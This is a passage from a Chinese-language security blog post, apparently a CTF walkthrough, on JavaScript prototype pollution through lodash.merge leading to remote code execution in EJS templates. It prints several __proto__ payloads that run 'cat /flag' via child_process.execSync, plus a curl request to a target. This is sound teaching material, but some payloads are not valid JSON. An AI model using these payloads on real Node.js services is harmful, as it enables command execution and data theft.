+<p><strong>构造恶意Payload</strong>：<br>覆盖 <code>Object.prototype</code> 的某个方法（如 <code>toString</code>），插入恶意代码：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;toString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;() =&gt; &#123; return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString() &#125;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>或更隐蔽的方式：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;toString&quot;</span><span class="punctuation">:</span> function() <span class="punctuation">&#123;</span> </span><br><span class="line">        return this.flag ||= require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString();</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="步骤3：触发模板渲染执行代码"><a href="#步骤3：触发模板渲染执行代码" class="headerlink" title="步骤3：触发模板渲染执行代码"></a><strong>步骤3：触发模板渲染执行代码</strong></h5><p>假设模板 <code>index.ejs</code> 中有如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= language %&gt;  // 或其他输出点</span><br></pre></td></tr></table></figure>
+<p>当 <code>language</code> 未定义时，EJS 会尝试从原型链查找 <code>language</code> 属性。若 <code>Object.prototype.language</code> 被污染为恶意函数，则会执行该函数。</p>
+<p><strong>最终Payload</strong>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;language&quot;</span><span class="punctuation">:</span> function() <span class="punctuation">&#123;</span></span><br><span class="line">      return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString();</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="步骤4：发送请求并获取flag"><a href="#步骤4：发送请求并获取flag" class="headerlink" title="步骤4：发送请求并获取flag"></a><strong>步骤4：发送请求并获取flag</strong></h5><ol>
+<li><strong>发送POST请求</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://target.com/ \</span><br><span class="line">-H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">-d <span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;language&quot;: function()&#123; return require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString() &#125;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>触发模板渲染</strong>：<br>访问首页 <code>GET /</code>，模板会尝试渲染 <code>language</code> 属性，执行污染后的函数，返回flag。</li>
+</ol>
+<h4 id="3-技术原理"><a href="#3-技术原理" class="headerlink" title="3. 技术原理"></a><strong>3. 技术原理</strong></h4><ul>
+<li><strong>原型链污染</strong>：通过 <code>lodash.merge</code> 将 <code>__proto__</code> 注入到 <code>data</code> 对象，污染 <code>Object.prototype</code>。</li>
+<li><strong>模板引擎触发</strong>：EJS 渲染时访问被污染属性（如 <code>language</code>），调用已覆盖的函数，执行任意命令。</li>
+<li><strong>RCE链</strong>：<br>污染函数 → 模板调用函数 → 执行系统命令 → 返回flag。</li>
+</ul>
+<p>🤔</p>
+<ul>
+<li><strong>关键点</strong>：  <ol>
+<li>识别 <code>lodash.merge</code> 合并用户输入。  </li>
+<li>构造 <code>__proto__</code> 或 <code>constructor.prototype</code> 污染原型链。  </li>
+<li>利用模板引擎渲染触发恶意代码。</li>
+</ol>
+</li>
+<li><strong>最终效果</strong>：通过污染 <code>Object.prototype.language</code>，在渲染时执行 <code>cat /flag</code>，直接获取flag。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://oight.github.io">Oight</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://oight.github.io/posts/bba757cf/">http://oight.github.io/posts/bba757cf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://oight.github.io" target="_blank">Welcome！This is Oight！</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%91%A8%E6%8A%A5/">周报</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/9e349d62/" title="Python沙箱逃逸（未完成）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Python沙箱逃逸（未完成）</div></div><div class="info-2"><div class="info-item-1">Python沙箱逃逸我们知道Python可以利用反序列化漏洞以及其他漏洞进行攻击，因此，在CTF中也会通过防火墙来进行防御。今天我们就讨论一下如何绕过防火墙来实现攻击行为，即Python的沙箱逃逸   什么是Python沙箱Python 沙箱（Sandbox） 是一个隔离的代码执行环境，用于安全地运行不受信任的代码，防止其对宿主系统造成破坏。在Python中，沙箱通过限制代码的访问权限（如文件读写、网络请求、系统命令执行等），确保程序只能在可控范围内操作。   比如在Python反序列化中，我们需要通过反序列化来让程序执行我们想让它执行的代码来实现相应的功能。在这个过程中，我们就借助了Python中的一些函数和模块来实现这些功能。 同样的，为了避免安全风险，程序的设计者会想办法禁止我们利用这些危险的函数和模块。 示例：（一个简单的Python沙箱） 1234567891011121314# 创建一个禁用危险函数的环境def safe_exec(code):    allowed_builtins = &#123;&quot;abs&quot;, &quot;max&quot;,...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/d9660052/" title="DASCTF2024十月赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-04</div><div class="info-item-2">DASCTF2024十月赛</div></div><div class="info-2"><div class="info-item-1">WEBflow创建实例，提示： Welcome to My Flask App  This is a simple web app using Flask.    给出了任意文件读功能   看看 flask 应用的目录结构：   my_flask_app/ │ ├── app/ │   ├── __init__.py │   ├── routes/ │   │   ├── __init__.py │   │   ├── main.py │   │   └── auth.py │   ├── models/ │   │   ├── __init__.py │   │   └── user.py │   ├── templates/ │   │   ├── layout.html │   │   └── home.html │   └── static/ │       ├── css/ │       └── js/ │ ├── config.py ├── requirements.txt ├── migrations/ │   └── ... └── run.py ...</div></div></div></a><a class="pagination-related" href="/posts/9e349d62/" title="Python沙箱逃逸（未完成）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-30</div><div class="info-item-2">Python沙箱逃逸（未完成）</div></div><div class="info-2"><div class="info-item-1">Python沙箱逃逸我们知道Python可以利用反序列化漏洞以及其他漏洞进行攻击，因此，在CTF中也会通过防火墙来进行防御。今天我们就讨论一下如何绕过防火墙来实现攻击行为，即Python的沙箱逃逸   什么是Python沙箱Python 沙箱（Sandbox） 是一个隔离的代码执行环境，用于安全地运行不受信任的代码，防止其对宿主系统造成破坏。在Python中，沙箱通过限制代码的访问权限（如文件读写、网络请求、系统命令执行等），确保程序只能在可控范围内操作。   比如在Python反序列化中，我们需要通过反序列化来让程序执行我们想让它执行的代码来实现相应的功能。在这个过程中，我们就借助了Python中的一些函数和模块来实现这些功能。 同样的，为了避免安全风险，程序的设计者会想办法禁止我们利用这些危险的函数和模块。 示例：（一个简单的Python沙箱） 1234567891011121314# 创建一个禁用危险函数的环境def safe_exec(code):    allowed_builtins = &#123;&quot;abs&quot;, &quot;max&quot;,...</div></div></div></a><a class="pagination-related" href="/posts/f0940727/" title="NoSQL"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-11</div><div class="info-item-2">NoSQL</div></div><div class="info-2"><div class="info-item-1">NoSQL注入意外在学习内网渗透途中接触到了NoSQL注入，发现知识库里也没有，所以在这里记录一下什么是NoSQL？NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。 大多数遇到的NoSQL注入，其采用的数据库都是MongoDB。  读这里详细了解MongoDB  NoSQL 注入的分类有两种 NoSQL 注入分类的方式：第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。 第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。 重言式注入  又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。 联合查询注入  联合查询是一种众所周知的 SQL...</div></div></div></a><a class="pagination-related" href="/posts/f66dca92/" title="Python反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-30</div><div class="info-item-2">Python反序列化</div></div><div class="info-2"><div class="info-item-1">Python 反序列化漏洞什么是Python的序列化与反序列化什么是Python的序列化众所周知，Python是一种面向对象的语言。在Python中，一切皆对象。数字，字符串，函数，模块等等，都是对象。对象的本质是内存中的一个数据结构，包含属性（数据）和方法（操作）。 由于Python中对象的形式多种多样，变化万千，在存储时按照原本的形式来存储过于庞大且麻烦，所以我们就需要把Python对象转换为可存储或可传输的标准化格式。将Python对象转换为可存储或传输的标准化格式（如字节流、字符串）的过程，就叫做Python的序列化。   什么是Python的反序列化既然为了存储和传输方便，将Python对象通过序列化的方式转换成了一种标准化的格式，那么在程序执行时，我们就需要把标准化格式还原为Python对象，而这个过程，就叫做Python的反序列化。 ...</div></div></div></a><a class="pagination-related" href="/posts/4d9b8a15/" title="RCE，XSS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-19</div><div class="info-item-2">RCE，XSS</div></div><div class="info-2"><div class="info-item-1">PHP RCE记录一道关于PHP函数漏洞利用的题目 题目在这里    创建实例显示源代码如下：   123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123;    highlight_file(__FILE__);&#125; else &#123;    $host = $_GET[&#x27;host&#x27;];    $host = escapeshellarg($host);    $host = escapeshellcmd($host);    $sandbox = md5(&quot;glzjin&quot;....</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Oight</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Oight"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.</span> <span class="toc-text">原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是原型链污染？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E7%94%9F%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">为什么会发生原型链污染？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E5%8F%A3%E4%B8%8E%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.1.</span> <span class="toc-text">突破口与利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text">具体操作步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%AD%A5%E9%AA%A4%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.3.</span> <span class="toc-text">解决步骤与原理详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">1. 漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">2. 漏洞利用步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E7%A1%AE%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8"><span class="toc-number">1.2.3.2.1.</span> <span class="toc-text">步骤1：确认漏洞存在</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E5%88%A9%E7%94%A8%E6%B1%A1%E6%9F%93%E5%AE%9E%E7%8E%B0RCE"><span class="toc-number">1.2.3.2.2.</span> <span class="toc-text">步骤2：利用污染实现RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E8%A7%A6%E5%8F%91%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.3.2.3.</span> <span class="toc-text">步骤3：触发模板渲染执行代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9A%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E5%B9%B6%E8%8E%B7%E5%8F%96flag"><span class="toc-number">1.2.3.2.4.</span> <span class="toc-text">步骤4：发送请求并获取flag</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">3. 技术原理</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/bba757cf/" title="原型链污染">原型链污染</a><time datetime="2025-03-05T12:37:44.000Z" title="发表于 2025-03-05 20:37:44">2025-03-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/9e349d62/" title="Python沙箱逃逸（未完成）">Python沙箱逃逸（未完成）</a><time datetime="2025-01-30T08:35:43.000Z" title="发表于 2025-01-30 16:35:43">2025-01-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/f66dca92/" title="Python反序列化">Python反序列化</a><time datetime="2025-01-30T04:24:21.000Z" title="发表于 2025-01-30 12:24:21">2025-01-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/49ae7cb9/" title="archlinux">archlinux</a><time datetime="2025-01-07T06:28:25.000Z" title="发表于 2025-01-07 14:28:25">2025-01-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/d9660052/" title="DASCTF2024十月赛">DASCTF2024十月赛</a><time datetime="2025-01-04T04:40:49.000Z" title="发表于 2025-01-04 12:40:49">2025-01-04</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Oight</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
